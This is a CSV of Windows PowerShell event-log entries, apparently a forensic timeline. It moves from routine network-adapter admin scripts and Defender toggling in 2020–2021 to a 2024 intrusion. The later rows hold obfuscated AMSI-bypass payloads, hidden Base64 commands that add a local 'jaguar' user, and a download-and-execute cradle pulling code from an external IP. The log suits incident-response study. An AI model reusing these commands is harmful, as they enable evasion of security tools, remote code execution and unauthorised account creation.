Timestamp,Logged,Hostname,ExtIP,Description,Details,EventData,SourceFile
2020-11-03 08:30:32,Logged,WINDOWS-MK5JK4O,-,PowerShell 명령 실행,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command Set-MpPreference -DisableRealtimeMonitoring $true,-,Windows PowerShell.evtx
2020-11-03 08:30:33,Logged,WINDOWS-MK5JK4O,-,PowerShell 명령 실행,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command Set-ExecutionPolicy Unrestricted -force; $Bla1 = Get-NetAdapter | where {$_.Status -eq 'Up'}; $aa = Get-NetIPInterface -AddressFamily IPv4 | Sort-Object -Property InterfaceMetric | select -First 1; echo ' ' >> C:\HDservice\SBO.log; Echo 'Old Interface Metric:' >> C:\HDservice\SBO.log; $bb =Get-NetIPInterface -InterfaceIndex $bla1.InterfaceIndex -AddressFamily IPv4; $bb >> C:\HDservice\SBO.log; echo ' ' >> C:\HDservice\SBO.log;if ($aa.InterfaceMetric -le 2) {Echo 'Metric to low, no changes. Script finished. --- ' >> C:\HDservice\SBO.log; exit}; If ($aa.InterfaceMetric -gt $bb.InterfaceMetric) {Echo 'Metric already at minum, no changes. Script finished. --- ' >> C:\HDservice\SBO.log; exit}; Set-NetIPInterface -InterfaceIndex $bla1.InterfaceIndex -AddressFamily IPv4 -InterfaceMetric ($aa.InterfaceMetric-1); Echo 'New Interface Metric:' >> C:\HDservice\SBO.log; Get-NetIPInterface -InterfaceIndex $bla1.InterfaceIndex -AddressFamily IPv4 >> C:\HDservice\SBO.log; Echo 'Script finished. --- ' >> C:\HDservice\SBO.log; echo ' ' >> C:\HDservice\SBO.log; Exit;",-,Windows PowerShell.evtx
2020-11-03 08:30:33,Logged,WINDOWS-MK5JK4O,-,PowerShell 명령 실행,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command Set-ExecutionPolicy Unrestricted -force; md C:\HDService\ -ErrorAction SilentlyContinue; get-date >> C:\HDservice\SBO.log; Echo 'Reading List of connected NICs' >> C:\HDservice\SBO.log; $Bla1 = Get-NetAdapter | where {$_.Status -eq 'Up'}; If ($Bla1.length -eq 0){Echo 'ERROR: No connected NIC found! (Abort)' >> C:\HDservice\SBO.log; exit}; If ($Bla1.length -gt 1){Echo 'ERROR: More than one connected NIC found! (Abort)' >> C:\HDservice\SBO.log; exit}; echo $Bla1 >> C:\HDservice\SBO.log; echo 'GUID: ' $Bla1.InterfaceGUID >> C:\HDservice\SBO.log; echo ' ' >> C:\HDservice\SBO.log; Echo 'Reading List of disconnected NICs' >> C:\HDservice\SBO.log; $Bla2 = Get-NetAdapter | where {$_.Status -ne 'Up'}; echo $Bla2 >> C:\HDservice\SBO.log; If ($Bla2.length -eq 0){Echo 'No disconnected NIC found, everthing OK! (Finished)' >> C:\HDservice\SBO.log; exit}; $NewBind = @(); $Blupp=Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\TCPIP\Linkage -Name Bind; Echo 'Current Bind Registry entry:' >> C:\HDservice\SBO.log; $Blupp.Bind >> C:\HDservice\SBO.log; echo ' ' >> C:\HDservice\SBO.log; If ($Blupp.Bind.count -eq 0) {Echo 'ERROR: Empty BIND registry key (Abort)' >> C:\HDservice\SBO.log; exit} ; If ($Blupp.Bind[0] -match $Bla1.InterfaceGUID) {Echo 'Current binding order is already OK! (Finished)' >> C:\HDservice\SBO.log; exit}; foreach ($x in $Blupp.Bind) {if ($x -match $Bla1.InterfaceGUID) {$NewBind = $NewBind + $x}}; foreach ($x in $Blupp.Bind) {if ($x -notmatch $Bla1.InterfaceGUID) {$NewBind = $NewBind + $x}}; If ($NewBind.Count -ne $Blupp.Bind.Count) {Echo 'FATAL ERROR (Abort)' >> C:\HDservice\SBO.log; exit}; Remove-ItemProperty -ErrorAction SilentlyContinue -Path HKLM:\System\CurrentControlSet\Services\TCPIP\Linkage -Name BackupBind; Rename-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\TCPIP\Linkage -Name Bind -NewName BackupBind; Echo 'New Bind Registry entry:' >> C:\HDservice\SBO.log; New-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\TCPIP\Linkage -Name Bind -PropertyType MultiString -Value $NewBind; $NewBind >> C:\HDservice\SBO.log; echo ' ' >> C:\HDservice\SBO.log; Exit;",-,Windows PowerShell.evtx
2020-11-03 08:31:58,Logged,WINDOWS-MK5JK4O,-,PowerShell 명령 실행,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command Set-ExecutionPolicy Unrestricted -force,-,Windows PowerShell.evtx
2020-11-03 08:31:58,Logged,WINDOWS-MK5JK4O,-,PowerShell 명령 실행,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command Set-ExecutionPolicy Unrestricted -force; C:\HDService\Bin\LangList.ps1,-,Windows PowerShell.evtx
2020-11-03 08:31:59,Logged,WINDOWS-MK5JK4O,-,PowerShell 명령 실행,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command Set-MpPreference -DisableRealtimeMonitoring $true,-,Windows PowerShell.evtx
2020-11-03 08:43:46,Logged,INT-HN,-,PowerShell 명령 실행,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden C:\HDService\Bin\CheckComputername.ps1,-,Windows PowerShell.evtx
2020-11-03 08:43:50,Logged,INT-HN,-,PowerShell 명령 실행,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command Set-MpPreference -DisableRealtimeMonitoring $false,-,Windows PowerShell.evtx
2020-11-03 09:34:55,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-11-03 09:34:56,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-11-03 09:39:45,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-11-03 09:39:45,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-11-03 10:00:13,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-11-03 10:00:14,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-11-03 10:22:50,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-11-03 10:22:50,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-11-03 23:51:30,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-11-03 23:51:31,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-11-14 05:03:26,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-11-14 05:03:27,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-11-14 05:15:55,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-11-14 05:15:56,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-11-25 04:00:04,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2020-11-25 04:00:04,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2020-12-04 12:06:41,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-12-04 12:06:41,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-12-04 12:17:52,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-12-04 12:17:52,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-12-06 23:45:10,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-12-06 23:45:10,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-12-07 00:52:45,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-12-07 00:52:45,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2020-12-25 04:00:05,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2020-12-25 04:00:05,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2021-01-24 04:00:04,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2021-01-24 04:00:04,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2021-01-28 05:47:11,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2021-01-28 05:47:11,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2021-01-28 06:16:51,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2021-01-28 06:16:54,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2021-01-29 00:40:41,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2021-01-29 00:40:42,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2021-02-06 02:24:56,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2021-02-06 02:24:57,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2021-02-23 04:00:01,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2021-02-23 04:00:01,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2021-03-25 04:00:04,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2021-03-25 04:00:05,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2021-03-25 23:58:31,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2021-03-25 23:58:31,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2021-03-26 01:37:31,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2021-03-26 01:37:31,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2021-04-24 04:00:04,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2021-04-24 04:00:04,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2021-05-17 00:01:02,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2021-05-17 00:01:03,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2021-05-24 04:00:04,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2021-05-24 04:00:05,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2021-06-23 04:00:01,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2021-06-23 04:00:01,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2021-06-29 06:07:42,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2021-06-29 06:07:43,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Disable,-,Windows PowerShell.evtx
2021-07-23 04:00:02,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2021-07-23 04:00:02,Logged,INT-HN,-,PowerShell 명령 실행,C:\windows\System32\RemoteFXvGPUDisablement.exe Warning,-,Windows PowerShell.evtx
2024-10-04 08:17:48,Logged,INT-HN,-,PowerShell 명령 실행,powershell.exe -exec bypass -noni -nop -w 1 -C  -jOiN('91x78:101x116c46c83x101~114>118Q105%99<101:80:111<105Q110<116p77<97%110%97@103>101:114>93Q58c58:83>101>114p118<101:114c67~101<114%116c105x102<105<99%97%116@101c86%97p108x105@100~97@116<105:111~110p67c97>108c108Q98Q97%99:107Q32x61%32@123:36p116p114:117x101@125~10@116@114Q121:123~10p91c82Q101p102%93x46@65<115p115p101p109~98~108x121Q46p71>101>116>84Q121p112p101x40p39p83>121>115c39c43p39@116%101%109:46~77@97>110%39>43<39<97Q103@101>109<101<110c116%46x65%117c116~39>43@39<111x109:97>116Q105<111c110p46x65@109:39c43:39%115c105~85>116:39:43p39Q105p108:115%39Q41c46%71@101@116c70Q105~101@108c100%40<39@97>109Q39c43x39<115:105Q73Q110p105p39~43<39Q116@70~97p105Q108c101c100~39@44c32Q39c78@111c110~80>39<43>39%117x98%108Q105>99>44Q83p116@97:39Q43%39Q116x105c99p39x41@46Q83%101c116>86:97@108p117p101@40@36<110~117x108<108@44<32p36@116x114~117x101:41:10~125~99<97Q116c99@104>123x125~10x119Q104Q111Q97p109c105'.sPlIt( '~x:p>%@c<Q')|%{([ChAr] [InT] $_) } ) | & ( $sHeLlid[1]+$SHeLliD[13]+'x'),-,Windows PowerShell.evtx
2024-10-04 12:30:25,Logged,INT-HN,-,PowerShell 명령 실행,"powershell.exe -exec bypass -noni -nop -w 1 -C  INvoke-ExpreSsioN(-jOIN[char[]](91,78,101 , 116 , 46 , 83, 101 ,114 , 118 ,105, 99, 101 ,80 ,111 , 105, 110 ,116 , 77 , 97 ,110,97,103 ,101 , 114, 93 , 58, 58, 83,101, 114, 118 , 101,114 , 67,101 ,114 , 116 ,105, 102 , 105 ,99, 97 , 116, 101 ,86 ,97 , 108 , 105, 100 , 97 ,116, 105,111 , 110, 67,97 ,108 , 108 ,98 , 97,99,107,32 , 61, 32 , 123 , 36 , 116,114 ,117 , 101 , 125 ,10, 116 , 114,121 , 123 , 10 ,91 , 82 , 101, 102 , 93 ,46, 65,115 , 115 ,101 ,109,98 ,108 , 121, 46,71 , 101, 116,84 , 121,112, 101, 40 ,39,83,121, 115 , 39 , 43,39,116 ,101 , 109 ,46 ,77,97,110, 39 , 43 ,39 ,97 , 103 , 101, 109 ,101,110 ,116 ,46 , 65 ,117, 116 , 39,43, 39 , 111,109, 97 , 116 ,105 ,111 , 110 , 46, 65 ,109,39 , 43, 39 ,115,105 ,85 , 116 ,39,43, 39,105 ,108, 115,39 ,41,46 , 71 ,101 , 116,70, 105 , 101 ,108 , 100,40, 39 ,97,109,39 , 43 , 39,115 , 105, 73,110, 105 , 39 ,43, 39 , 116, 70 , 97 ,105 , 108 ,101 , 100 ,39 ,44 , 32,39 ,78 ,111,110, 80,39, 43,39,117 , 98 ,108,105 , 99,44, 83,116 , 97,39,43,39, 116 , 105 ,99,39 , 41 , 46 , 83 , 101,116,86, 97 ,108,117 , 101 , 40,36 ,110,117 ,108, 108 ,44 ,32,36, 116 , 114,117,101,41,10 ,125, 99, 97,116,99, 104, 123 , 125,10 , 119 , 104,111, 97 ,109 , 105 ) )",-,Windows PowerShell.evtx
2024-10-04 12:35:29,Logged,INT-HN,-,PowerShell 명령 실행,powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAiADsAdwBoAG8AYQBtAGkA,-,Windows PowerShell.evtx
2024-10-04 12:38:02,Logged,INT-HN,-,PowerShell 명령 실행,powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAiADsAbgBlAHQAIAB1AHMAZQByACAAagBhAGcAdQBhAHIAIABhAGQAbQBpAG4AQAAxADIAMwAhACAALwBhAGQAZAA=,-,Windows PowerShell.evtx
2024-10-04 13:29:54,Logged,INT-HN,-,PowerShell 명령 실행,powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://45.83.140.96:80/a')),-,Windows PowerShell.evtx
2024-10-04 13:29:59,Logged,INT-HN,-,PowerShell 명령 실행,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile,-,Windows PowerShell.evtx
2024-10-05 03:29:52,Logged,INT-HN,-,PowerShell 명령 실행,"powershell.exe -exec bypass -noni -nop -w 1 -C  $(seT-varIABLe 'ofS' '' ) +[StRING](( 91,78,101 , 116 , 46,83 , 101, 114 , 118, 105, 99 ,101 ,80 ,111, 105 ,110 ,116 , 77,97 ,110, 97 ,103, 101 , 114,93 , 58, 58 , 83, 101, 114,118 , 101,114, 67 ,101,114 , 116 ,105, 102 ,105 , 99 , 97 , 116, 101 ,86 ,97 ,108, 105 ,100, 97 , 116, 105,111, 110 ,67 ,97 , 108 , 108,98, 97 ,99 , 107, 32 , 61 ,32 ,123, 36, 116,114,117,101 ,125 , 10,116 ,114,121,123 , 10 , 91, 82 ,101,102 , 93, 46, 65 , 115 , 115 ,101, 109, 98, 108,121, 46 , 71,101, 116,84,121,112,101,40 , 39 , 83 , 121, 115 , 39,43,39, 116 ,101,109 ,46 ,77, 97 , 110,39,43 , 39,97 ,103 , 101, 109, 101 , 110 , 116, 46,65 ,117 ,116 ,39 , 43 , 39 , 111,109 , 97, 116,105,111,110 ,46 ,65,109 , 39,43, 39 ,115,105 ,85,116 ,39 , 43,39,105 ,108 ,115, 39, 41, 46 , 71 ,101,116,70, 105 , 101 , 108,100,40,39,97, 109, 39 , 43 ,39, 115,105 , 73, 110,105 ,39 ,43 ,39 , 116 , 70 ,97 , 105,108, 101 ,100 ,39, 44,32,39 ,78 , 111 , 110 , 80 ,39, 43, 39,117,98 , 108 , 105 ,99, 44 ,83 ,116,97 ,39 , 43,39, 116, 105 ,99 ,39,41,46, 83 ,101,116,86 , 97 , 108 , 117 , 101 ,40,36 , 110, 117 , 108, 108, 44, 32 ,36 ,116 ,114 ,117,101 , 41,10, 125 ,99,97 ,116 , 99,104 , 123 , 125 ,10, 110 ,101 ,116,32 ,117 , 115 , 101 , 114,32 , 106, 97 ,103, 117 , 97 , 114 ,36,32,97,100, 109, 105 ,110 ,64 , 49 , 50 ,51, 33 , 32 , 47 ,97 , 100 ,100 )|%{( [Int] $_ -AS[chAr]) }) +$( SEt-ITEM 'VAriABLe:OfS' ' ' ) |&( $enV:COMsPEC[4,15,25]-joIn'')",-,Windows PowerShell.evtx
